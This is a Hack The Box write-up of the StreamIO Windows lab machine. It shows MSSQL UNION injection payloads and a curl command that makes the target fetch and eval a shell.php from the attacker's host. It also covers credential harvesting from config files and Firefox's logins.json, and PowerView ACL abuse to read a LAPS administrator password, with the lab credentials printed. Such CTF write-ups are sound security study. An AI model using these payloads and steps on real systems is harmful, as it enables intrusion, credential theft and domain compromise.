---
title: 'HTB-StreamIO'
published: 2025-09-18
draft: false
toc: true
---
**Start 14:46 26-03-2025**

---
```
Scope:
10.10.11.158
```
# Recon

## Nmap

```bash
sudo nmap -sC -sV -p- streamio -sT -T5 --min-rate=5000 -Pn -vvvv

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-03-26 20:47:51Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-03-26T20:49:22+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49705/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

I also checked for UDP ports, specifically `161` but got the following result:

```bash
sudo nmap -sC -sV -p161 streamio -sU -T5 --min-rate=5000 -Pn -vvvv

PORT    STATE         SERVICE REASON      VERSION
161/udp open|filtered snmp    no-response
```

Time to start analyzing what we've got.

This appears to be a **Windows** machine with a few ports open.

## 445/TCP - SMB

![](attachments/484f78c2681e6d7e8fff3506d984d889.png)

## 80/TCP - HTTP
### Feroxbuster

![](attachments/80766607284841d8f0a3623a42c1328f.png)

Nothing out of the ordinary

## 443/TCP - HTTPS
### Feroxbuster

![](attachments/47e1d56221d468ed01f1a8b746251f4f.png)

![](attachments/2644e4e9a96a293700f05f1ebcbcfead.png)

Couple of interesting things but let's check out the certificate, since we're dealing with a domain server.

![](attachments/7e15a349b79f27a4775b28f13ce16ef0.png)

I notice the **watch.streamIO.htb** subdomain, which I add to my `/etc/hosts` list. I then go ahead and look up the website:

![](attachments/b4ed7df9f0567f6c5cd867ff453a75d9.png)

And below is the **watch.streamio.htb** subdomain:

![](attachments/b5ef05a09a579079d80f7a18c2240d5c.png)

### Gobuster

I went ahead and ran a `gobuster` enum as well because I clearly did not receive what I needed:

![](attachments/c5f111bec6baed00c74efb47db9593ea.png)

Here I found the `/master.php` endpoint, which `feroxbuster` did not manage to find.

![](attachments/378c4e4a45b56a6ff4c0fbc3c8ca4d84.png)

Other than that I didn't really manage to find anything else here. I then decided to enumerate the subdomain:

![](attachments/45733523513b3cded36eb7a10a793a27.png)

Here I managed to find the `/search.php` endpoint.

![](attachments/2e67b93cae952b7d73d6e8f04bfbfac3.png)

When clicking on **Watch** I get this error:

![](attachments/6856b3cbf42c0bd4baee5c648f14f321.png)

### Burpsuite - SQLi

I opened up `burp` and started playing around with the params, thinking I could maybe get some SQLi action going.

![](attachments/5fe5e72291818a54eda8d207c9c838f9.png)

![](attachments/2673139a71a608ba3aa461bac694b79c.png)

:::note
For further testing I had to leverage the [[(My)SQL Injection.pdf]] cheatsheet.
:::

Since we're dealing with a **Windows** machine however, we're HIGHLY LIKELY going to be injecting `MSSQL` commands.

I started off with `' UNION select 1-- -` and then worked up with the amount of columns until I'd get a response:

![](attachments/d5aa7f342d9c5a57eca2fe543fa48f30.png)

![](attachments/b58afe2d85e283e940d2e96e3a3dbcb1.png)

It seems like the amount of columns is `6`, so now we need to modify the UNION query.

I went ahead and inserted the `@@version` command to check the MSSQL version:

![](attachments/dfe9764eef4c3c36cef40faea0c65b6f.png)

![](attachments/21cec26ab75e2941414ed1ede5e66360.png)

:::note
For the following I went over to the website since it wasn't clearly readable on `burp`.
:::

:::important
Sidenote: for all the below queries I had to resort to [this cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
:::

I then enumerated the databases.

```sql
American' UNION select 1,name,3,4,5,6 from master..sysdatabases-- -
```

![](attachments/78e996fe26128a5a708fad4313207419.png)

Then went on to enumerate the `STREAMIO` database:

![](attachments/7970ece6823c350f33926b8e7d03c773.png)

Next up I enumerated the `users` columns:

![](attachments/13ad41410e2c6eb25500e4e97e392f7b.png)

Next I enumerated the usernames:

:::caution
There was a metric shit ton of them.
:::

![](attachments/8b0364f03aa05808a64698c876ab8eea.png)

![](attachments/59513f5d662d6cd46a17bce2caf94f90.png)

And now the passwords:

![](attachments/dde4983af07141e5122a49c9d79e36e0.png)

I started cracking them with `crackstation`:

![](attachments/bcbd9f977550459da3077e06dc759466.png)

![](attachments/1a64af0230f7fd112f675347e9396237.png)

![](attachments/1aaf614b179aa5fa1cd4d9a040c7ccb4.png)

Now we got a huge list of password spray-able credentials.

### Password Spraying

I tried to password spray the creds against either `winrm` or `smb` but neither worked unfortunately, so I decided to try out the web server instead using `hydra`:

![](attachments/136d4575b358bfdc3d980a92b88573cd.png)

We got a valid set of creds!

```
yoshihide
66boysandgirls..
```

We can now go ahead and access the `/admin` panel:

![](attachments/3648604d2501b9329cfe95e456805842.png)

### Endpoint Fuzzing - wfuzz

I then went ahead and started fuzzing for other endpoints as I suspected there'd be more (the guided mode told me).

For this I needed the session cookie:

![](attachments/d4aa5152d47adc567ad2f3a826f57f59.png)

```bash
wfuzz -u https://streamio.htb/admin/\?FUZZ\= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=kfr3bfkljibfpckvc8lt3sjs7s" --hh 1678
```

![](attachments/adccfcf7b0e7e6ccd5a25330ed5aed90.png)

As I quickly found out, there's another param here `debug`.

![](attachments/8a7c6074f5e8ac69ecb3287a34a2aa72.png)

![](attachments/524a740f7b0d8d0d836e8c1ab4cee12a.png)

:::note
I honestly got a bit stuck here and had no clue what to do, then checked a writeup and understood that I should use `php wrappers`, just as explained in [[9. Common Web App Attacks#9.2.2 - PHP Wrappers]].
:::

![](attachments/a2df4ffd4b869e4d2cbc6baf96c06ae2.png)

Now I got the following output, which I can then use `echo base64 -d` on.

![](attachments/1a652c54dc566a2bdfbfa70343a8a565.png)

![](attachments/841caad878c6cc90ffeca1ea0d6940a1.png)

We get the source code for the `master.php` page:

```php
<SNIP>

<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>%
```

We notice the `include` param on the POST variable.

### Remote File Inclusion

Since the source code is talking about including the `index.php` page we can try and include our own 'page' instead.

I'll create a simple `shell.php` file:

![](attachments/469a0889dedb7224016b512fe218275d.png)

:::note
Since the server is running `eval` I won't have to use `<php?>` wrappers.
:::

We can then run the following in order to include our file, run it as a `POST` request, and finally get RCE.

```bash
curl --insecure -b "PHPSESSID=kfr3bfkljibfpckvc8lt3sjs7s" -X POST --data "include=http://10.10.16.2/shell.php" https://streamio.htb/admin/index.php\?debug\=master.php
```


# Foothold
## Enumeration

![](attachments/a6ef0d89f95e0a38945930f01e2c3bd5.png)

After finally getting access I tried to check my privs:

![](attachments/c4457a30b8f0103d03d13590387efd8f.png)

Nothing notable unfortunately, they're not making it easy for us...

![](attachments/61cdf1047042d45f172ae07343f65114.png)

![](attachments/893c1ca0efd4989180526f8af807a8a9.png)

Sucks, we can't view any of the directories...

I went back into the `C:\inetpub` directory and started enumeration from there again

Here I found a few thing:

![](attachments/b0feecdf30ddc1c8d38810b3e450cdeb.png)

![](attachments/2e3263ea3b2b91497a48431b1746c0a8.png)

Which resulted in the following:

![](attachments/dfd8f063f133042fcdc79bdc58987217.png)

:::todo
- Enumerate and find the MSSQL db credentials inside the `C:\inetpub` directory
:::

### Creds

Since there were way too many files in the web root I used the following command to recursively check through the files:

```powershell
dir -recurse *.php | select-string -pattern "database"
```

![](attachments/7f506e1485d84c693d942aa0dee65c10.png)

We get two new user id's, `db_user` and `db_admin`. Naturally I'll want to try the admin first.

```
db_admin
B1@hx31234567890

db_user
B1@hB1@hB1@h
```

## MSSQL

I then tried to use `sqlcmd` interactively but had no luck:

![](attachments/ae8a790211d789493fbcdef0cd6ba371.png)

Instead I could issue commands using the `-Q` flag:

![](attachments/1cae2b372a7decc961d44c91bfaee733.png)

Afterwards I tried to get the users but got the same ones as previously, so I had to modify my query slightly.

![](attachments/b7618e363fbc56c87224061c0a8ba632.png)

Instead I gave the `-d` flag with the correct database.

![](attachments/1574400fc92ab340e3dbf492bd6375d4.png)

Nice! Let's try and crack em.

![](attachments/9f535202d42c304ea27c7b472e709450.png)

We got only 1 new one, the one from *nikk37*, which is coincidentally one of the users on this target.

## Lateral Movement

I can now go ahead and sign in to `winrm` using the newly found creds.

```
nikk37
get_dem_girls2@yahoo.com
```

![](attachments/9cad42140a05bad7ff05eef0c285be0b.png)

### user.txt

![](attachments/6caa2927e832fd5e9894cb3fd363625b.png)

### winPEAS

I then uploaded `winPEASx64.exe` and let it run, where I found the following notable stuff:

![](attachments/6e9ca8c910dd47a5724d22b082e1bfc2.png)

Inside this directory I found even more stuff:

![](attachments/32c872e170f66ec18ea883a2c132ccfa.png)

I noticed a file called `logins.json` and checked it out.

```json
{"nextId":5,"logins":[{"id":1,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECG2cZGM1+s+hBAiQvduUzZPkCw==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECKA5q3v2TxvuBBjtXIyW2UjOBvrg700JOU1yfrb0EnMRelw=","guid":"{9867a888-c468-4173-b2f4-329a1ec7fa60}","encType":1,"timeCreated":1645526456872,"timeLastUsed":1645526456872,"timePasswordChanged":1645526456872,"timesUsed":1},{"id":2,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDMUru7zbEb0BAiinvqXr8Trkg==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECOXW0KzZftfWBBARYsMPvSrUwx8+QfJdxzT+","guid":"{739bd2a5-5fec-4e08-97d2-3c619bf02be2}","encType":1,"timeCreated":1645526470377,"timeLastUsed":1645526470377,"timePasswordChanged":1645526470377,"timesUsed":1},{"id":3,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPtpFUOBoOFABBDVCjdAdstUxzB6i9DCqvOw","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCocciyfDsthBBDm3YSuhBsW3roo3l3zOUuF","guid":"{a98a87bc-86aa-489c-9227-d6579ab5148b}","encType":1,"timeCreated":1645526484137,"timeLastUsed":1645526484137,"timePasswordChanged":1645526484137,"timesUsed":1},{"id":4,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECB1j+gQdXzIuBAgO0o/N3J2MrQ==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNt9zddW+/h7BBCBgoQVGaDQjF2IpeQEl/Td","guid":"{2be21548-7c50-42f0-8ef6-b33b1e77f150}","encType":1,"timeCreated":1645526511842,"timeLastUsed":1645526511842,"timePasswordChanged":1645526511842,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

It seemed to hold encrypted usernames and passwords, however I had no clue how to decypher them.

## Mozilla Password cracking

I found [this tool](https://github.com/lclevy/firepwd) that would help me crack the passwords:

![](attachments/3b55e6fb32be32d9d7aa5a5d786c1fe2.png)

Then I had to install the pip packages and went ahead and ran it:

![](attachments/9c4d853b8051cacf4c134229dd5dd559.png)

We found a new set of creds!

```
JDgodd
password@12
```

However I also notice the password for the *admin* user is some sort of anagram for *JDgodd*, let's add all these passwords to a list and spray them.

## More Password Spraying

![](attachments/a27e9314383e06974a3fee1693e69ff5.png)

Indeed the password for *admin* is actually for the *JDgodd* user!

![](attachments/1da1cd8b54f8f0378448deea8e7f480f.png)

However we cannot login via `winrm`.

## Bloodhound

To fully grasp the AD network I will upload `SharpHound.ps1` and execute it, then check out the results in `BloodHound`.

![](attachments/e294febfefb3421a7dd64b4e2b74fda4.png)

![](attachments/22ece0c82bbcdb0a16498230c2e819c5.png)

![](attachments/b9641f5096b0d2946aa505dac844b24b.png)

![](attachments/bd7af2456932eb246835c59c4e652e74.png)

After ingesting the data we notice that *JDGodd* is part of the **CORE STAFF** group. This group has the **ReadLAPSPassword** permission enabled:

![](attachments/0261a72a475a463395a8f0e48ff39a11.png)

![](attachments/305130cca1f14774936b0db3bfb6f19b.png)

## PowerView

Let's upload `PowerView.ps1` and import it and get to work.


```powershell
# Set up credentials
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

# Then add them to the group
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

![](attachments/6634ed3d0f19c9fb4307b83875b91777.png)

Now we can go ahead and use `netexec` with the `--laps` option in order to read the **LAPSPassword**:

![](attachments/80d160dc094b658f99c2cb29dffe8c05.png)

We got it! Let's use `psexec` to log in as admin.


# Privilege Escalation

```
administrator
13IFj++6(7[J]&
```

![](attachments/98d36b27090fcb655c2cf2e7ff112bc9.png)

EZ PZ.

## root.txt

![](attachments/72d0bf37ba431bc7bfe0d6c1b19d8794.png)

![](attachments/5ff882755579d67609bf985d2795401a.png)

---

**Finished 12:33 19-04-2025**

[^Links]: [[Hack The Box]] [[OSCP Prep]]

#SQLi #wfuzz #RFI #BloodHound 
